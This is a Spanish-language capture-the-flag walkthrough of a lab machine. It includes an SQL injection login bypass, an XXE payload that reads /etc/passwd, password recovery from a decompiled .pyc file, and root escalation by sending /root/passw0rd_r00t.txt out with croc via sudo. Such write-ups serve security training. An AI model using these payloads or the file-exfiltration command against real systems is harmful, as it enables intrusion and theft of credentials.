## Reconocimiento:

Puerto 22 : SSH 

Puerto 80 : HTTP

En la web hay un panel de login falso ya que ingresas con cualquier cosa en los dos parámetros.

Dentro hay un portal con posibles usuarios y un código secreto:

```xml
cmVjdWVyZGEuLi4gdHUgY29udHJhc2XxYSBlcyB0dSB1c3Vhcmlv
```

Decodificándolo dice:

```bash
echo "cmVjdWVyZGEuLi4gdHUgY29udHJhc2XxYSBlcyB0dSB1c3Vhcmlv" | base64 -d
# info:
recuerda... tu contraseña es tu usuario
```

Con esto podríamos probar entrar por SSH con los posibles usuarios siendo estos mismos contraseñas. Es posible, pero hay más que se puede hacer y por amor al arte seguiré con el path tradicional de esta máquina.

Dándole back desde el portal nos redirige a un nuevo panel de login:

```bash
http://172.17.0.2/admin.php
```

Donde nos pide un correo y contraseña y revela un usuario ( notadmin ). No tenemos ningún correo, así que logro el bypass borrando el parámetro `type=email` con las dev tools y agrego notadmin:

```bash
User : notadmin
Pass : 'or 1=1-- -
```

Accedo a un segundo portal:

```bash
http://172.17.0.2/externalentitiinjection.php 
```

Dentro hay un XML External Entity Processor

Así que genero un payload para leer archivos del sistema:

```bash
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <contenido>&xxe;</contenido>
</data>
```

Con esto vemos que existe el usuario jeremias y ezequiel, por lo que la contraseña es el mismo nombre. Funciona con jeremías. 

## Escalada Jeremias → ezequiel

Dentro veo un archivo compilado en formato .pyc por lo que no se puede leer de manera clara y toca pasarlo a la maquina host para su desensamblado:

```bash
scp jeremias@172.17.0.2:/home/jeremias/ezequiel.pyc .
```

Utilizo una herramienta web:

```bash
https://pylingual.io
```

Revisando el código veo 2 posibles contraseñas:

```bash
234r3fsd2
-34fsdrr32
```

Resulta ser que estas 2 juntas son la contraseña de ezequiel:

```bash
su ezequiel
password: 234r3fsd2-34fsdrr32
```

## Escalada ezquiel → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/local/bin/croc
```

Croc es una herramienta para transferir archivos entre sistemas.

https://github.com/schollz/croc?source=post_page-----8ad0a852297c---------------------------------------

También nos revela que dentro de la carpeta /root hay un archivo llamado:

```bash
passw0rd_r00t.txt
```

Pero no podemos leerla desde la maquina víctima así que utilizo croc para tráerlo:

```bash
sudo -u root croc send /root/passw0rd_r00t.txt
```

Desde el host la recibo y contiene la contraseña de root:

```bash
fl4sk1pwd
```

```bash
su root
```

Listo.
